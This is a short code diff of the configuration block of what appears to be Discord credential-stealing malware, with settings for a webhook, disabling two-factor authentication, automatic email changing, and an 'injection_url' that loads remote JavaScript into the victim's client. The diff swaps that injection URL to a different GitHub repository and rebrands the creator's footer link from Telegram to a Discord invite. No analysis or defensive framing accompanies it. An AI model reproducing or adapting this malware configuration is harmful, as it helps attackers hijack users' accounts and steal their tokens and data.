@@ -16,14 +16,14 @@ var config = {
   logout: "true",
   "logout-notify": "true",
   "init-notify": "true",
-  "embed-color": 3553599,
+  "embed-color": 15418782,
   disable2FA: "%DISABLEFA%",
   changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/ksch-58/sub/main/index.js",
+    "https://raw.githubusercontent.com/selfbot12345/index/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -92,7 +92,7 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
         },
 
         footer: {
-          text: ` [${config.creator}] | https://t.me/Sordeal`,
+          text: ` [${config.creator}] | https://discord.gg/kVcKDj7tBQ`,
         },
       },
     ],
